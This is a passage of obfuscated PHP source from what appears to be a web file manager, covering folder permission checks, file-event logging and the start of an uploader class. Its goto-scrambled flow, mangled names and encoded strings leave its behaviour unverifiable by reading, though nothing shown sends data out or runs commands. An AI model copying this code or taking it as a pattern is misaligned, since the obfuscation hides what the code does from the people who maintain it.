($E±×Äé×) { return $E±×Äé×; } goto EŞìƒÀÃ÷; B’§»”ŠŠ‘: $EÅöœ™¼„ù = array_to_keyvalue($f‹Ú¼¥Û§¯, $Eğ®¢¦–œ[33], $Eğ®¢¦–œ[374]); $E±×Äé× = array(); $fãÑø›ˆ¹ = $D„÷·æÄ¬å; goto Dñ‡ÛíÔé; F·ë²îù˜: $D„÷·æÄ¬å = Session::get($Eğ®¢¦–œ[1663]); $D„÷·æÄ¬å = array_to_keyvalue($D„÷·æÄ¬å, $Eğ®¢¦–œ[33], $Eğ®¢¦–œ[1542]); $fšÇøšˆ¾ô = array($Eğ®¢¦–œ[393] => SourceModel::TYPE_USER, $Eğ®¢¦–œ[395] => USER_ID); goto D—¬µÚÓ‚; fÓÓÉèƒ…¶: $fãÑø›ˆ¹ = array_values(array_unique($fãÑø›ˆ¹)); $e³«Õ¢—áö = $fãÑø›ˆ¹; foreach ($e³«Õ¢—áö as $f‰©éÉïì²) { $e÷·Å‹Ûë› = $Eµ“ƒÇø©ö->getInfo($f‰©éÉïì²); $dª¡ö£Š¤ = $C£¥Öìˆ->parentLevelArray($e÷·Å‹Ûë›[$Eğ®¢¦–œ[373]]); $fãÑø›ˆ¹ = array_merge($fãÑø›ˆ¹, $dª¡ö£Š¤); } goto D«Ê…‘ÌÎ±; EŞìƒÀÃ÷: $fâóîØ™ù« = Model($Eğ®¢¦–œ[1704])->listData(); $bÌŠŒØ¿˜Ö = array(); foreach ($fâóîØ™ù« as $e…Œ£Ë) { if ($e…Œ£Ë[$Eğ®¢¦–œ[549]] == 0 && $e…Œ£Ë[$Eğ®¢¦–œ[1562]] == $Eğ®¢¦–œ[376]) { $bÌŠŒØ¿˜Ö[] = $e…Œ£Ë[$Eğ®¢¦–œ[368]]; } } goto F·ë²îù˜; Fé†¸†Ğ½ê: return $E±×Äé×; goto CØå¦Œ†Ì; D«Ê…‘ÌÎ±: $fãÑø›ˆ¹ = array_values(array_unique($fãÑø›ˆ¹)); foreach ($fãÑø›ˆ¹ as $f‰©éÉïì²) { $e÷·Å‹Ûë› = $Eµ“ƒÇø©ö->getInfo($f‰©éÉïì²); $E±×Äé×[] = $e÷·Å‹Ûë›[$Eğ®¢¦–œ[856]][$Eğ®¢¦–œ[374]]; } $E±×Äé× = array_values(array_unique($E±×Äé×)); goto Fé†¸†Ğ½ê; CØå¦Œ†Ì: } private function makeSourceAuth($a×‚‹ÒÍé, $f‹ŒÒœì–«) { goto CÙŞŸæŸµ–; D„†‚‹·»ƒ: if (!$F¥Œ–µ’‡) { $E­ê‰Œ¢ = array_to_keyvalue($E­ê‰Œ¢, $c„‡ŞÂŞìÏ[1542]); $D¸¡»è…‹ô = $a×‚‹ÒÍé[$c„‡ŞÂŞìÏ[395]]; $DªÊèÔùŸ§ = isset($E­ê‰Œ¢[$D¸¡»è…‹ô]) ? $E­ê‰Œ¢[$D¸¡»è…‹ô] : !1; if ($DªÊèÔùŸ§) { $F¥Œ–µ’‡ = array($c„‡ŞÂŞìÏ[1708] => intval($DªÊèÔùŸ§[$c„‡ŞÂŞìÏ[549]][$c„‡ŞÂŞìÏ[549]]), $c„‡ŞÂŞìÏ[1709] => $DªÊèÔùŸ§[$c„‡ŞÂŞìÏ[549]]); } } if ((!$F¥Œ–µ’‡ || $F¥Œ–µ’‡[$c„‡ŞÂŞìÏ[1700]] <= 0) && $a×‚‹ÒÍé[$c„‡ŞÂŞìÏ[393]] == SourceModel::TYPE_GROUP) { $F¥Œ–µ’‡ = $this->authDeepCheck($a×‚‹ÒÍé[$c„‡ŞÂŞìÏ[374]], $F¥Œ–µ’‡); } return $F¥Œ–µ’‡; goto c£ÒƒÆäÚœ; D¡‚ˆ×²¿Î: $E•ßĞ£Ç¨í = array_merge(array($a×‚‹ÒÍé[$c„‡ŞÂŞìÏ[374]]), array_reverse($E•ßĞ£Ç¨í)); $F¥Œ–µ’‡ = !1; foreach ($E•ßĞ£Ç¨í as $aÙğ„§§…Ã) { if (!isset($f‹ŒÒœì–«[$aÙğ„§§…Ã])) { continue; } $cáÉøÙ¿¸Å = $this->authMake($f‹ŒÒœì–«[$aÙğ„§§…Ã]); if ($cáÉøÙ¿¸Å[$c„‡ŞÂŞìÏ[1701]]) { $F¥Œ–µ’‡ = $cáÉøÙ¿¸Å; break; } } goto D„†‚‹·»ƒ; CÙŞŸæŸµ–: $c„‡ŞÂŞìÏ =& $_SERVER[İåâé¾]; $E­ê‰Œ¢ = Session::get($c„‡ŞÂŞìÏ[1663]); $E•ßĞ£Ç¨í = Model($c„‡ŞÂŞìÏ[850])->parentLevelArray($a×‚‹ÒÍé[$c„‡ŞÂŞìÏ[373]]); goto D¡‚ˆ×²¿Î; c£ÒƒÆäÚœ: } public function authOwnerApply($C‘à¦óáß•) { goto aˆ¥Ñ¿‰; aù¸êÍ÷¨£: $Cææ¢»ÎåŸ = array(); $d’ÌÀÍêéì = array(); foreach ($eØ¬²­²‘µ as $DÛŠ‚†¸‘Š => $bÁµ‡»˜Ò) { $EŠÍ‹‹ÓˆÃ = $this->authFolderOwnerUser($bÁµ‡»˜Ò); $Cææ¢»ÎåŸ[$DÛŠ‚†¸‘Š] = $EŠÍ‹‹ÓˆÃ; $d’ÌÀÍêéì = array_merge($d’ÌÀÍêéì, $EŠÍ‹‹ÓˆÃ[$AîÃ¶¸ù„Ò[416]]); if ($EŠÍ‹‹ÓˆÃ[$AîÃ¶¸ù„Ò[1711]]) { break; } } goto fÈÕÕ’åíÖ; fÑÈğÂëÎÂ: $Cœ»—À‰ = array($AîÃ¶¸ù„Ò[415] => array($AîÃ¶¸ù„Ò[1642], $AÏÓÚëŠßÕ)); $eØ¬²­²‘µ = $this->field($BŠé“ÇóŒ)->where($Cœ»—À‰)->select(); $eØ¬²­²‘µ = array_to_keyvalue_group($eØ¬²­²‘µ, $AîÃ¶¸ù„Ò[374]); goto aù¸êÍ÷¨£; aˆ¥Ñ¿‰: $AîÃ¶¸ù„Ò =& $_SERVER[İåâé¾]; if (!$C‘à¦óáß•[$AîÃ¶¸ù„Ò[549]] || $C‘à¦óáß•[$AîÃ¶¸ù„Ò[1710]]) { return $C‘à¦óáß•; } if (AuthModel::authCheckRoot($C‘à¦óáß•[$AîÃ¶¸ù„Ò[549]][$AîÃ¶¸ù„Ò[1700]])) { return $C‘à¦óáß•; } goto dåš‡§òë¨; EÄŞÄĞÅ‘Ÿ: $C‘à¦óáß•[$AîÃ¶¸ù„Ò[549]][$AîÃ¶¸ù„Ò[1712]] = Model($AîÃ¶¸ù„Ò[1713])->userListInfo($d’ÌÀÍêéì); return $C‘à¦óáß•; goto DóÜ¼É§½; fÈÕÕ’åíÖ: if (count($d’ÌÀÍêéì) == 0) { $d’ÌÀÍêéì = $this->authFolderOwnerGroup($C‘à¦óáß•[$AîÃ¶¸ù„Ò[395]]); } $d’ÌÀÍêéì = array_unique($d’ÌÀÍêéì); if (AuthModel::authCheckRoot($C‘à¦óáß•[$AîÃ¶¸ù„Ò[549]][$AîÃ¶¸ù„Ò[1700]])) { $d’ÌÀÍêéì[] = USER_ID; } goto EÄŞÄĞÅ‘Ÿ; dåš‡§òë¨: $AÏÓÚëŠßÕ = Model($AîÃ¶¸ù„Ò[850])->parentLevelArray($C‘à¦óáß•[$AîÃ¶¸ù„Ò[373]]); $AÏÓÚëŠßÕ = array_merge(array($C‘à¦óáß•[$AîÃ¶¸ù„Ò[374]]), array_reverse($AÏÓÚëŠßÕ)); $BŠé“ÇóŒ = $AîÃ¶¸ù„Ò[1699]; goto fÑÈğÂëÎÂ; DóÜ¼É§½: } private function authFolderOwnerGroup($dØĞ—Ö—‰«) { $Cª†ĞŒã† =& $_SERVER[İåâé¾]; $CÍ¥ÂÅ¥› = Model($Cª†ĞŒã†[1627])->where(array($Cª†ĞŒã†[1542] => $dØĞ—Ö—‰«))->select(); $E¯—Ì¢²ò = array(); if (!$CÍ¥ÂÅ¥›) { return $E¯—Ì¢²ò; } foreach ($CÍ¥ÂÅ¥› as $b¸·‚çÈ) { $aæĞ§ØÒğ¼ = $this->authInfo($b¸·‚çÈ); if (AuthModel::authCheckRoot($aæĞ§ØÒğ¼[$Cª†ĞŒã†[549]])) { $E¯—Ì¢²ò[] = $b¸·‚çÈ[$Cª†ĞŒã†[1086]]; } } return $E¯—Ì¢²ò; } private function authFolderOwnerUser($fŸŠè”Û¶) { $b­ÍÂæ‘™µ =& $_SERVER[İåâé¾]; $b†²Äçø×ô = array(); $dÆ¨Ç×Àò = !1; foreach ($fŸŠè”Û¶ as $c½í”é‰ÇÂ) { $eÁ«¾Í™ˆ¦ = $this->authInfo($c½í”é‰ÇÂ); if ($c½í”é‰ÇÂ[$b­ÍÂæ‘™µ[395]] == $b­ÍÂæ‘™µ[402]) { $dÆ¨Ç×Àò = !0; } if ($c½í”é‰ÇÂ[$b­ÍÂæ‘™µ[393]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($eÁ«¾Í™ˆ¦[$b­ÍÂæ‘™µ[549]])) { $b†²Äçø×ô[] = $c½í”é‰ÇÂ[$b­ÍÂæ‘™µ[395]]; } } } return array($b­ÍÂæ‘™µ[416] => $b†²Äçø×ô, $b­ÍÂæ‘™µ[1711] => $dÆ¨Ç×Àò); } public function authMake($c‡¦¯´ÖĞ) { goto eÚÙõ‰Ç¹ë; Dë³ Õ¶éÑ: $b•øÄ™Ñë£ = 0; foreach ($c‡¦¯´ÖĞ as $Féˆº‹²¥“) { $a±’ÑÙìà’ = $this->authInfo($Féˆº‹²¥“); $CØà…°–Šœ = $Féˆº‹²¥“[$fñ£„ë‚ï¼[395]]; $B‚Ùî¥´‚† = intval($a±’ÑÙìà’[$fñ£„ë‚ï¼[549]]); if ($Féˆº‹²¥“[$fñ£„ë‚ï¼[393]] == SourceModel::TYPE_USER && $CØà…°–Šœ == USER_ID) { $d¸ §óÀ„º = !0; $EéäŞŒ¬Åå = $a±’ÑÙìà’; $c¥â±¦Ó× = $B‚Ùî¥´‚†; } else { if ($Féˆº‹²¥“[$fñ£„ë‚ï¼[393]] == SourceModel::TYPE_GROUP && in_array($CØà…°–Šœ, $e¼ÕˆÓº‰­)) { $E´î¡Í‚¨ = !0; if ($B‚Ùî¥´‚† >= $a’ÛµÔöÆÂ) { $a’ÛµÔöÆÂ = $B‚Ùî¥´‚†; $F’Çœë‡¹ = $a±’ÑÙìà’; } } else { if ($CØà…°–Šœ == 0) { $b•øÄ™Ñë£ = !0; $f‹ô§ù‘ˆĞ = $a±’ÑÙìà’; $CÚ˜ˆÛìÙ = $B‚Ùî¥´‚†; } } } } $cğÓœŞÅáÄ = $d¸ §óÀ„º ? $c¥â±¦Ó× : ($E´î¡Í‚¨ ? $a’ÛµÔöÆÂ : $CÚ˜ˆÛìÙ); goto f»ÌŒ¥Á; f»ÌŒ¥Á: $a±’ÑÙìà’ = $d¸ §óÀ„º ? $EéäŞŒ¬Åå : ($E´î¡Í‚¨ ? $F’Çœë‡¹ : $f‹ô§ù‘ˆĞ); $e‚ğÃøó·„ = array($fñ£„ë‚ï¼[1708] => intval($cğÓœŞÅáÄ), $fñ£„ë‚ï¼[1709] => $a±’ÑÙìà’); return $e‚ğÃøó·„; goto EÊÒ¾¾Ş¡; b’…ç«ñ¢”: $e¼ÕˆÓº‰­ = array_to_keyvalue($BØ¯×ÆÙç, $fñ£„ë‚ï¼[33], $fñ£„ë‚ï¼[1542]); $c¥â±¦Ó× = 0; $a’ÛµÔöÆÂ = 0; goto CÉÙô‚å÷Û; D±Ì¯ÕÜÂ×: $f‹ô§ù‘ˆĞ = 0; $d¸ §óÀ„º = 0; $E´î¡Í‚¨ = 0; goto Dë³ Õ¶éÑ; eÚÙõ‰Ç¹ë: $fñ£„ë‚ï¼ =& $_SERVER[İåâé¾]; if (!$c‡¦¯´ÖĞ) { return array($fñ£„ë‚ï¼[1700] => 0, $fñ£„ë‚ï¼[1701] => !1); } $BØ¯×ÆÙç = Session::get($fñ£„ë‚ï¼[1663]); goto b’…ç«ñ¢”; CÉÙô‚å÷Û: $CÚ˜ˆÛìÙ = 0; $EéäŞŒ¬Åå = 0; $F’Çœë‡¹ = 0; goto D±Ì¯ÕÜÂ×; EÊÒ¾¾Ş¡: } public function authTargetInfoMake($e­òÂƒÉ¦) { goto eÔ±ù±ùø; eÔ±ù±ùø: $DÅøÚ«™ã© =& $_SERVER[İåâé¾]; $aˆ—È‚Ø¯ = array(); $dÅÊÈ¤©Û­ = array(); goto A‰ƒíªìñ¨; A‰ƒíªìñ¨: foreach ($e­òÂƒÉ¦ as $b­¿®Ç¡ìÛ) { if ($b­¿®Ç¡ìÛ[$DÅøÚ«™ã©[393]] == SourceModel::TYPE_USER) { $aˆ—È‚Ø¯[] = intval($b­¿®Ç¡ìÛ[$DÅøÚ«™ã©[395]]); } else { if ($b­¿®Ç¡ìÛ[$DÅøÚ«™ã©[393]] == SourceModel::TYPE_GROUP) { $dÅÊÈ¤©Û­[] = intval($b­¿®Ç¡ìÛ[$DÅøÚ«™ã©[395]]); } } } if ($aˆ—È‚Ø¯) { $aˆ—È‚Ø¯ = Model($DÅøÚ«™ã©[1713])->userListInfo($aˆ—È‚Ø¯); } if ($dÅÊÈ¤©Û­) { $dÅÁ÷†ğ†— = array($DÅøÚ«™ã©[1625] => array($DÅøÚ«™ã©[1642], $dÅÊÈ¤©Û­)); $dÅÊÈ¤©Û­ = Model($DÅøÚ«™ã©[1707])->field($DÅøÚ«™ã©[1643])->where($dÅÁ÷†ğ†—)->select(); $dÅÊÈ¤©Û­ = array_to_keyvalue($dÅÊÈ¤©Û­, $DÅøÚ«™ã©[1542]); } goto F¸÷§ÇÃ°˜; F¸÷§ÇÃ°˜: return array($DÅøÚ«™ã©[1714] => $aˆ—È‚Ø¯, $DÅøÚ«™ã©[1715] => $dÅÊÈ¤©Û­); goto a÷·®¶ÃÔŠ; a÷·®¶ÃÔŠ: } private function authInfo($d´“Äñ¨°) { $C«¿‹ˆ½â¾ =& $_SERVER[İåâé¾]; if ($d´“Äñ¨°[$C«¿‹ˆ½â¾[1680]]) { $A†¯Ç¶Ì¸£ = Model($C«¿‹ˆ½â¾[1696])->listData($d´“Äñ¨°[$C«¿‹ˆ½â¾[1680]]); if (!$A†¯Ç¶Ì¸£) { return !1; $aê³äÖĞÛ³ = Model($C«¿‹ˆ½â¾[1696])->listData(); $dÇ¡³¢öî™ = array_filter_by_field($aê³äÖĞÛ³, $C«¿‹ˆ½â¾[549], $C«¿‹ˆ½â¾[402]); return $dÇ¡³¢öî™; } $Eè·¥šŞ…Ü = array_field_key($A†¯Ç¶Ì¸£, array($C«¿‹ˆ½â¾[368], $C«¿‹ˆ½â¾[28], $C«¿‹ˆ½â¾[549], $C«¿‹ˆ½â¾[1560], $C«¿‹ˆ½â¾[1563])); $Eè·¥šŞ…Ü[$C«¿‹ˆ½â¾[1716]] = $d´“Äñ¨°; return $Eè·¥šŞ…Ü; } else { return array($C«¿‹ˆ½â¾[812] => 0, $C«¿‹ˆ½â¾[1548] => $d´“Äñ¨°[$C«¿‹ˆ½â¾[1681]], $C«¿‹ˆ½â¾[387] => $C«¿‹ˆ½â¾[33], $C«¿‹ˆ½â¾[1560] => $C«¿‹ˆ½â¾[1717]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\165\162\143\x65\x5f\145\x76\x65\156\x74"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\x54\x69\155\x65", "\164\x69\155\145", "\151\x6e\163\145\x72\164", "\146\x75\156\143\x74\151\x6f\156"), array("\144\145\163\143", '', "\151\x6e\163\x65\162\x74\54\165\x70\x64\x61\x74\x65\54\163\145\x6c\x65\x63\164", "\x6a\x73\x6f\x6e")); public function addEvent($E…İ•½¶·, $CéœÛ°¢º•, $dÂÖùÊÂ£á = '') { goto bª½óöÎ„©; Dé¶ô…â¹Ô: if ($dÂÖùÊÂ£á && is_string($dÂÖùÊÂ£á)) { $dÂÖùÊÂ£á = array($DË†ŠøŞ«[1573] => $dÂÖùÊÂ£á); } $cò’Š„†ğİ = array($DË†ŠøŞ«[415] => $E…İ•½¶·, $DË†ŠøŞ«[1718] => $b„æ²òÌ‚[$DË†ŠøŞ«[384]], $DË†ŠøŞ«[1077] => USER_ID, $DË†ŠøŞ«[810] => $CéœÛ°¢º•, $DË†ŠøŞ«[1079] => $dÂÖùÊÂ£á); $this->addSystemLog($CéœÛ°¢º•, $cò’Š„†ğİ); goto F™ƒİÂŠË¤; bª½óöÎ„©: $DË†ŠøŞ« =& $_SERVER[İåâé¾]; $b„æ²òÌ‚ = Model($DË†ŠøŞ«[850])->sourceInfo($E…İ•½¶·); if (!$b„æ²òÌ‚) { return !1; } goto Dé¶ô…â¹Ô; F™ƒİÂŠË¤: return $this->add($cò’Š„†ğİ); goto e÷õ¯õ“„Î; e÷õ¯õ“„Î: } private function addSystemLog($E‘°¦¯œ´…, $AƒºÅÂîæœ) { $F‡÷»ä† =& $_SERVER[İåâé¾]; if ($E‘°¦¯œ´… == $F‡÷»ä†[1719]) { $E‘°¦¯œ´… = $AƒºÅÂîæœ[$F‡÷»ä†[1586]][$F‡÷»ä†[1720]]; } else { if (in_array($E‘°¦¯œ´…, array($F‡÷»ä†[1519], $F‡÷»ä†[1721]))) { $E‘°¦¯œ´… = $AƒºÅÂîæœ[$F‡÷»ä†[1586]][$F‡÷»ä†[449]]; } } $E§ÛËœ»ĞÕ = array_merge($AƒºÅÂîæœ, array($F‡÷»ä†[1722] => $AƒºÅÂîæœ[$F‡÷»ä†[374]], $F‡÷»ä†[1723] => $AƒºÅÂîæœ[$F‡÷»ä†[1723]])); Model($F‡÷»ä†[1483])->addLog($F‡÷»ä†[1724] . $E‘°¦¯œ´…, $E§ÛËœ»ĞÕ); } public function eventCreate($B‡ÅÆ¯Ş¾ç, $b‚äÈ­ëºä) { $f¼Ş„¬à“ =& $_SERVER[İåâé¾]; $d„ä—ğ–®Œ = Model($f¼Ş„¬à“[850])->sourceInfo($B‡ÅÆ¯Ş¾ç); $eî‡…×ï‘ğ = array($f¼Ş„¬à“[1720] => $b‚äÈ­ëºä, $f¼Ş„¬à“[28] => $d„ä—ğ–®Œ[$f¼Ş„¬à“[28]]); return $this->addEvent($B‡ÅÆ¯Ş¾ç, $f¼Ş„¬à“[1719], $eî‡…×ï‘ğ); } public function eventFileEdit($e˜Î…¾ªŸ) { return $this->addEvent($e˜Î…¾ªŸ, $_SERVER[İåâé¾][1511]); } public function eventRecycle($d¼òÉÍÎí, $a—ğğö´¶) { return $this->addEvent($d¼òÉÍÎí, $_SERVER[İåâé¾][1721], $a—ğğö´¶); } public function eventRemove($fáæ¼Ú‡â) { $DŸ¨¡›‘ß =& $_SERVER[İåâé¾]; $A¬ƒ§š¼ºÃ = Model($DŸ¨¡›‘ß[850])->sourceInfo($fáæ¼Ú‡â); $F´„ßˆˆ˜Ê = $A¬ƒ§š¼ºÃ[$DŸ¨¡›‘ß[28]]; return $this->addEvent($A¬ƒ§š¼ºÃ[$DŸ¨¡›‘ß[384]], $DŸ¨¡›‘ß[1510], $F´„ßˆˆ˜Ê); } public function eventShare($D™ğôí§Ğæ, $A©Šˆ‘òŸÎ) { return $this->addEvent($D™ğôí§Ğæ, $_SERVER[İåâé¾][1519], $A©Šˆ‘òŸÎ); } public function eventMove($C½¸”ÈàŒ–, $Cî ß«‰ƒ‘, $Bà¤éç‡××) { goto bº•Ì­ÌŒµ; aß¢†¿ìÄ„: $this->addEvent($Cî ß«‰ƒ‘, $D‡²×ÑÃø‡[1727], $D¥±§‰òÌŸ); goto cœ‚Ñ´¼„Ò; fÒÃ¸‰±: $this->addEvent($C½¸”ÈàŒ–, $D‡²×ÑÃø‡[741], $D¥±§‰òÌŸ); $A–†Š‰µŒˆ = $F¶ßÈ°×°µ->sourceInfo($C½¸”ÈàŒ–); $D¥±§‰òÌŸ = array($D‡²×ÑÃø‡[374] => $A–†Š‰µŒˆ[$D‡²×ÑÃø‡[374]], $D‡²×ÑÃø‡[28] => $A–†Š‰µŒˆ[$D‡²×ÑÃø‡[28]]); goto aß¢†¿ìÄ„; bº•Ì­ÌŒµ: $D‡²×ÑÃø‡ =& $_SERVER[İåâé¾]; $F¶ßÈ°×°µ = Model($D‡²×ÑÃø‡[850]); $A–†Š‰µŒˆ = $F¶ßÈ°×°µ->sourceInfo($C½¸”ÈàŒ–); goto C¢Ğã‹å‹Ş; C¢Ğã‹å‹Ş: $bå¬£²‘‡ù = $F¶ßÈ°×°µ->sourceInfo($Cî ß«‰ƒ‘); $C‡£ªÉÓ = $F¶ßÈ°×°µ->sourceInfo($Bà¤éç‡××); $D¥±§‰òÌŸ = array($D‡²×ÑÃø‡[751] => $Cî ß«‰ƒ‘, $D‡²×ÑÃø‡[1725] => $bå¬£²‘‡ù[$D‡²×ÑÃø‡[28]], $D‡²×ÑÃø‡[752] => $Bà¤éç‡××, $D‡²×ÑÃø‡[1726] => $C‡£ªÉÓ[$D‡²×ÑÃø‡[28]]); goto fÒÃ¸‰±; cœ‚Ñ´¼„Ò: } public function eventCopy($dõÇÄÖ²Î) { $this->eventCreate($dõÇÄÖ²Î, $_SERVER[İåâé¾][740]); } public function eventRename($bßî†ÏÃ, $E˜ŸÈİ·ï, $E¥Òù’Ç‹¼) { $Bª¨’¶¾ÔÜ =& $_SERVER[İåâé¾]; $D¢ÒÀÆ…ˆ• = array($Bª¨’¶¾ÔÜ[751] => $E˜ŸÈİ·ï, $Bª¨’¶¾ÔÜ[752] => $E¥Òù’Ç‹¼); return $this->addEvent($bßî†ÏÃ, $Bª¨’¶¾ÔÜ[862], $D¢ÒÀÆ…ˆ•); } public function eventAddComment($BÃóÎ“òõÜ, $AÍáĞÈÏ) { return $this->addEvent($BÃóÎ“òõÜ, $_SERVER[İåâé¾][1728], $AÍáĞÈÏ); } public function eventAddDesc($cÕ©‹µİº©, $a¤°ìÂ‰à) { return $this->addEvent($cÕ©‹µİº©, $_SERVER[İåâé¾][1729], $a¤°ìÂ‰à); } public function listBySource($fÌ¸ŒĞÊÁ) { goto E¾¶áÃ„¸‡; B¨ñÃ›¬¹§: if ($DéÕÉÔ˜Éì[$fˆÃóÚ´½¯[375]] == $fˆÃóÚ´½¯[376]) { $E¾áàë¶¨² = Model($fˆÃóÚ´½¯[850])->listSearchChildren($fÌ¸ŒĞÊÁ, 20000); $E¾áàë¶¨²[] = $fÌ¸ŒĞÊÁ; $cöÚ“°‹—î = array($fˆÃóÚ´½¯[374] => array($fˆÃóÚ´½¯[7], $E¾áàë¶¨²)); } $dâ„‚ÀæÖ = $this->where($cöÚ“°‹—î)->order($fˆÃóÚ´½¯[1730])->selectPage(); if ($dâ„‚ÀæÖ[$fˆÃóÚ´½¯[353]][$fˆÃóÚ´½¯[354]] == 0) { $dâ„‚ÀæÖ[$fˆÃóÚ´½¯[353]][$fˆÃóÚ´½¯[354]] = 1; $dâ„‚ÀæÖ[$fˆÃóÚ´½¯[356]] = array(array($fˆÃóÚ´½¯[415] => $fÌ¸ŒĞÊÁ, $fˆÃóÚ´½¯[1718] => $DéÕÉÔ˜Éì[$fˆÃóÚ´½¯[384]], $fˆÃóÚ´½¯[1077] => $DéÕÉÔ˜Éì[$fˆÃóÚ´½¯[1731]], $fˆÃóÚ´½¯[810] => $fˆÃóÚ´½¯[1732], $fˆÃóÚ´½¯[1583] => $DéÕÉÔ˜Éì[$fˆÃóÚ´½¯[186]], $fˆÃóÚ´½¯[1079] => $fˆÃóÚ´½¯[33])); } goto eœá†£‰„Š; E¾¶áÃ„¸‡: $fˆÃóÚ´½¯ =& $_SERVER[İåâé¾]; $DéÕÉÔ˜Éì = Model($fˆÃóÚ´½¯[850])->sourceInfo($fÌ¸ŒĞÊÁ); $cöÚ“°‹—î = array($fˆÃóÚ´½¯[415] => $fÌ¸ŒĞÊÁ); goto B¨ñÃ›¬¹§; eœá†£‰„Š: $dâ„‚ÀæÖ = $this->eventListParse($dâ„‚ÀæÖ, $fÌ¸ŒĞÊÁ); show_json($dâ„‚ÀæÖ); goto Eíå¦Ã‡³ã; Eíå¦Ã‡³ã: } private function eventListParse($bçè×É”·, $a»éìÄ›‹ï) { goto AŸ‰‡“ä÷˜; cÅÀéÆ ¦ñ: $e‰ùŠ³Š¶ = Model($e“ô‚ïçÉ[521])->sourceListInfo($Dë“–‚‘Í›, !0); foreach ($Bê ¸³©­ as &$aÁ¹†»‘‹×) { goto EÓøß‰´; CÀİñËèÜ: $aÁ¹†»‘‹×[$e“ô‚ïçÉ[856]] = $e‰ùŠ³Š¶[$aÁ¹†»‘‹×[$e“ô‚ïçÉ[374]]]; $aÁ¹†»‘‹×[$e“ô‚ïçÉ[1733]] = $e‰ùŠ³Š¶[$aÁ¹†»‘‹×[$e“ô‚ïçÉ[1723]]]; if ($aÁ¹†»‘‹×[$e“ô‚ïçÉ[29]] == $e“ô‚ïçÉ[1510]) { $aÁ¹†»‘‹×[$e“ô‚ïçÉ[1733]] = $aÁ¹†»‘‹×[$e“ô‚ïçÉ[856]]; $aÁ¹†»‘‹×[$e“ô‚ïçÉ[1723]] = $aÁ¹†»‘‹×[$e“ô‚ïçÉ[1733]][$e“ô‚ïçÉ[374]]; $aÁ¹†»‘‹×[$e“ô‚ïçÉ[856]] = !1; $aÁ¹†»‘‹×[$e“ô‚ïçÉ[374]] = $e“ô‚ïçÉ[33]; } goto BãñçÓÙ·¹; BãñçÓÙ·¹: $aÁ¹†»‘‹×[$e“ô‚ïçÉ[1685]] = $F›†‹ôÊø‘[$aÁ¹†»‘‹×[$e“ô‚ïçÉ[1086]]]; goto F–¹æÅ†Œó; EÓøß‰´: $cÌß·”êâ =& $aÁ¹†»‘‹×[$e“ô‚ïçÉ[1586]]; if ($aÁ¹†»‘‹×[$e“ô‚ïçÉ[29]] == $e“ô‚ïçÉ[741] && isset($cÌß·”êâ[$e“ô‚ïçÉ[751]])) { $cÌß·”êâ[$e“ô‚ïçÉ[751]] = $e‰ùŠ³Š¶[$cÌß·”êâ[$e“ô‚ïçÉ[751]]]; $cÌß·”êâ[$e“ô‚ïçÉ[752]] = $e‰ùŠ³Š¶[$cÌß·”êâ[$e“ô‚ïçÉ[752]]]; } if ($aÁ¹†»‘‹×[$e“ô‚ïçÉ[29]] == $e“ô‚ïçÉ[1727] && isset($cÌß·”êâ[$e“ô‚ïçÉ[374]])) { $cÌß·”êâ[$e“ô‚ïçÉ[374]] = $e‰ùŠ³Š¶[$cÌß·”êâ[$e“ô‚ïçÉ[374]]]; } goto CÀİñËèÜ; F–¹æÅ†Œó: } $bçè×É”·[$e“ô‚ïçÉ[356]] = $Bê ¸³©­; goto eë†ì²Œ¥; eë†ì²Œ¥: return $bçè×É”·; goto B‰ôÍ‹«³Ø; BÜèç¿Š¨¸: $ağ«à¥ã¤ = array_to_keyvalue($Bê ¸³©­, $e“ô‚ïçÉ[33], $e“ô‚ïçÉ[1723]); foreach ($Bê ¸³©­ as $aÁ¹†»‘‹×) { $cÌß·”êâ = $aÁ¹†»‘‹×[$e“ô‚ïçÉ[1586]]; if ($aÁ¹†»‘‹×[$e“ô‚ïçÉ[29]] == $e“ô‚ïçÉ[741] && isset($cÌß·”êâ[$e“ô‚ïçÉ[751]])) { $Dë“–‚‘Í›[] = $cÌß·”êâ[$e“ô‚ïçÉ[751]]; $Dë“–‚‘Í›[] = $cÌß·”êâ[$e“ô‚ïçÉ[752]]; } if ($aÁ¹†»‘‹×[$e“ô‚ïçÉ[29]] == $e“ô‚ïçÉ[1727] && isset($cÌß·”êâ[$e“ô‚ïçÉ[374]])) { $Dë“–‚‘Í›[] = $cÌß·”êâ[$e“ô‚ïçÉ[374]]; } } $Dë“–‚‘Í› = array_merge($Dë“–‚‘Í›, $ağ«à¥ã¤, array($a»éìÄ›‹ï)); goto d¯ëá¸ÓŒŠ; d¯ëá¸ÓŒŠ: $Dë“–‚‘Í› = array_unique($Dë“–‚‘Í›); $c¯ÈŠòèšİ = array_unique(array_to_keyvalue($Bê ¸³©­, $e“ô‚ïçÉ[33], $e“ô‚ïçÉ[1086])); $F›†‹ôÊø‘ = Model($e“ô‚ïçÉ[1477])->userListInfo($c¯ÈŠòèšİ); goto cÅÀéÆ ¦ñ; AŸ‰‡“ä÷˜: $e“ô‚ïçÉ =& $_SERVER[İåâé¾]; $Bê ¸³©­ = $bçè×É”·[$e“ô‚ïçÉ[356]]; $Dë“–‚‘Í› = array_to_keyvalue($Bê ¸³©­, $e“ô‚ïçÉ[33], $e“ô‚ïçÉ[374]); goto BÜèç¿Š¨¸; B‰ôÍ‹«³Ø: } public function removeBySource($B¬ÉƒÚó‰) { $CŒ“‹´ìÑÅ = array($_SERVER[İåâé¾][415] => $B¬ÉƒÚó‰); $this->where($CŒ“‹´ìÑÅ)->remove(); } } goto D‘âÈˆ‘¿Ø; CğËçµï¬Ù: if (class_exists($_SERVER[İåâé¾][1369])) { class Services_JSON_Error extends PEAR_Error { function __construct($CÂ§à´òÌÑ = "\165\156\153\156\x6f\x77\x6e\x20\145\x72\x72\x6f\x72", $DËáÆÂ¼Ö = null, $E ÍÖµ£ŸÊ = null, $cƒ”µ²Œˆ = null, $A‚ƒõÏ¹ğ = null) { parent::PEAR_Error($CÂ§à´òÌÑ, $DËáÆÂ¼Ö, $E ÍÖµ£ŸÊ, $cƒ”µ²Œˆ, $A‚ƒõÏ¹ğ); } } } else { class Services_JSON_Error { function __construct($a Ö£…²î” = "\165\x6e\153\156\157\167\156\x20\x65\162\x72\157\x72", $E¯Ì©¦˜º = null, $d¤·Ç®òŒ = null, $eÀ‘â¹Èé¹ = null, $aÕ›òƒóÍË = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; 